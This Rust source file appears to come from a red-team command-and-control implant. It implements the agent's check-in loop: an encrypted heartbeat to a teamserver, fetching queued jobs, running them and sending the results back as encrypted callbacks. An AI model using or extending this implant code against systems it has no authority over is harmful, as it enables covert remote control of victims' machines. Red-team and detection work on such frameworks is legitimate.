//! Pending callback queue management and checkin dispatch.

use red_cell_common::demon::DemonCommand;

use super::PhantomAgent;
use crate::command::{PendingCallback, execute};
use crate::error::PhantomError;
use crate::protocol::{build_callback_packet, callback_ctr_blocks};

impl PhantomAgent {
    /// Send a `COMMAND_CHECKIN` heartbeat, then fetch and dispatch queued tasks
    /// with a separate `COMMAND_GET_JOB` request.
    ///
    /// Mirrors Specter's two-request pattern: the teamserver's `handle_checkin`
    /// returns no task bytes (always `Ok(None)`), so tasks must be fetched via
    /// a follow-up `CommandGetJob` call.
    pub async fn checkin(&mut self) -> Result<bool, PhantomError> {
        self.state.poll().await?;
        self.flush_pending_callbacks().await?;

        // Send COMMAND_CHECKIN heartbeat; the server always returns an empty body.
        let packet = build_callback_packet(
            self.agent_id,
            &self.session_crypto,
            self.ctr_offset,
            self.callback_seq,
            u32::from(DemonCommand::CommandCheckin),
            0,
            &[],
        )?;
        let _response = self.transport.send(&packet).await?;
        self.ctr_offset += callback_ctr_blocks(0);
        self.callback_seq += 1;

        // Fetch queued tasks with a separate COMMAND_GET_JOB request.
        let packages = self.get_job().await?;

        let mut exit_requested = false;
        for package in packages {
            execute(&package, &mut self.config, &mut self.state).await?;
            for callback in self.state.drain_callbacks() {
                let payload = callback.payload()?;
                let packet = build_callback_packet(
                    self.agent_id,
                    &self.session_crypto,
                    self.ctr_offset,
                    self.callback_seq,
                    callback.command_id(),
                    callback.request_id(),
                    &payload,
                )?;
                self.send_packet(packet).await?;
                self.ctr_offset += callback_ctr_blocks(payload.len());
                self.callback_seq += 1;
                if matches!(callback, PendingCallback::Exit { .. }) {
                    exit_requested = true;
                }
            }
        }

        Ok(exit_requested)
    }

    pub(super) async fn flush_pending_callbacks(&mut self) -> Result<(), PhantomError> {
        for callback in self.state.drain_callbacks() {
            let payload = callback.payload()?;
            let packet = build_callback_packet(
                self.agent_id,
                &self.session_crypto,
                self.ctr_offset,
                self.callback_seq,
                callback.command_id(),
                callback.request_id(),
                &payload,
            )?;
            self.send_packet(packet).await?;
            self.ctr_offset += callback_ctr_blocks(payload.len());
            self.callback_seq += 1;
        }

        Ok(())
    }
}
